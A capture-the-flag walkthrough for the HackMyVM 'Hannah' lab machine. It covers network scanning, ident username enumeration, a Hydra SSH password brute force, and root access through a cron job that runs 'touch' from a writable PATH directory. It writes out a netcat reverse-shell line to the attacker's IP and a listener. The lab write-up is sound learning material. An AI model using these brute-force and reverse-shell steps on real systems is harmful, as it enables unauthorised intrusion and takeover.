# CTF Penetration Testing

## HackMyVM

### Hannah - Machine

#### Machine Description

- Machine name: [Hannah](https://hackmyvm.eu/machines/machine.php?vm=Hannah)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Hannah Machine Logo" width="150"/>

### Tools Used

- Hydra
- ident-user-enum
- Nmap

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.129 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.129`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:54 EDT
Nmap scan report for 192.168.56.129
Host is up (0.00099s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp  open  http    nginx 1.18.0 ←
113/tcp open  ident? ←
MAC Address: 08:00:27:C1:4C:E2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.53 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting Ident](https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident)

[**#Ident-user-enum**](https://github.com/pentestmonkey/ident-user-enum)
Is a simple PERL script to query the ident service (113/TCP) in order to determine the owner of the process listening on each TCP port of a target system. The list of usernames gathered can be used for password guessing attacks on other network services. It can be installed with `apt install ident-user-enum`.
```
root@kali:/opt/local/recon/192.168.1.100# ident-user-enum 192.168.1.100 22 113 139 445
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.1.100:22  root
192.168.1.100:113 identd
192.168.1.100:139 root
192.168.1.100:445 root
```

`ident-user-enum 192.168.56.129 22 80 113`:
```
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.56.129:22       root
192.168.56.129:80       moksha ←
192.168.56.129:113      root
```

`hydra -l 'moksha' -P /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt 192.168.56.129 ssh`:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 08:34:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5189454 login tries (l:1/p:5189454), ~324341 tries per task
[DATA] attacking ssh://192.168.56.129:22/
[STATUS] 103.00 tries/min, 103 tries in 00:01h, 5189353 to do in 839:43h, 14 active
[22][ssh] host: 192.168.56.129   login: moksha   password: hannah
1 of 1 target successfully completed, 1 valid password found

[...]
```

`ssh moksha@192.168.56.129`:
```
moksha@192.168.56.129's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 30 14:38:51 2024 from 192.168.56.118
```

![Victim: moksha](https://img.shields.io/badge/Victim-moksha-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
moksha ←
```

`uname -a`:
```
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/moksha`

`ls -alps ./`:
```
total 32
4 drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 ./
4 drwxr-xr-x 3 root   root   4096 ene  4  2023 ../
0 lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
4 -rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
4 drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local/
4 -rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
4 -rw------- 1 moksha moksha   14 ene  4  2023 user.txt ←
4 -rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
```

`cat ./user.txt`:
```
HMVGGHFWP2023 ←
```

`ls -alps /var/www/html`:
```
total 16
4 drwxr-xr-x 2 root     root     4096 ene  4  2023 ./
4 drwxr-xr-x 3 root     root     4096 ene  4  2023 ../
4 -rw-r--r-- 1 www-data www-data   19 ene  4  2023 index.html
4 -rw-r--r-- 1 www-data www-data   25 ene  4  2023 robots.txt ←
```

`cat /var/www/html/index.html`:
```
Under construction
```

`cat /var/www/html/robots.txt`:
```
Disallow: /enlightenment ←
```

`find / -iname "enlightenment" 2> /dev/null`:
```
/tmp/enlIghtenment ←
```

`ls -alps /tmp/enlIghtenment`:
```
0 -rw-r--r-- 1 root root 0 sep 30 14:44 /tmp/enlIghtenment ←
```

`cat /tmp/enlIghtenment`:
```
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

[**#Scheduled/Cron jobs**]
Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep 
```

`ls -alps /etc/ | grep "cron"`:
```
 4 drwxr-xr-x  2 root root    4096 ene  4  2023 cron.d/
 4 drwxr-xr-x  2 root root    4096 ene  4  2023 cron.daily/
 4 drwxr-xr-x  2 root root    4096 ene  4  2023 cron.hourly/
 4 drwxr-xr-x  2 root root    4096 ene  4  2023 cron.monthly/
 4 -rw-r--r--  1 root root    1089 ene  4  2023 crontab
 4 drwxr-xr-x  2 root root    4096 ene  4  2023 cron.weekly/
```

`cat /etc/cron* 2>/dev/null | grep -v "^#"`:
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin ←

* * * * * root touch /tmp/enlIghtenment ←
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

`which touch`:
```
/usr/bin/touch ←
```

`ls -ld /media`:
```
drwxrwxrwx 3 root root 4096 ene  4  2023 /media ←
```

`which bash`:
```
/usr/bin/bash
```

`echo "nc -c '/usr/bin/bash' 192.168.56.118 4444" | tee /media/touch`:
```
nc -c '/usr/bin/bash' 192.168.56.118 4444 ←
```

`chmod +x /media/touch`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 4444`:
```
listening on [any] 4444 ... ←
```

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.129] 49430
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 28
4 drwx------  3 root root 4096 ene  4  2023 ./
4 drwxr-xr-x 18 root root 4096 ene  4  2023 ../
0 lrwxrwxrwx  1 root root    9 ene  4  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 ene  4  2023 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   15 ene  4  2023 root.txt ←
4 -rw-r--r--  1 root root   66 ene  4  2023 .selected_editor
```

`cat ./root.txt`:
```
HMVHAPPYNY2023 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
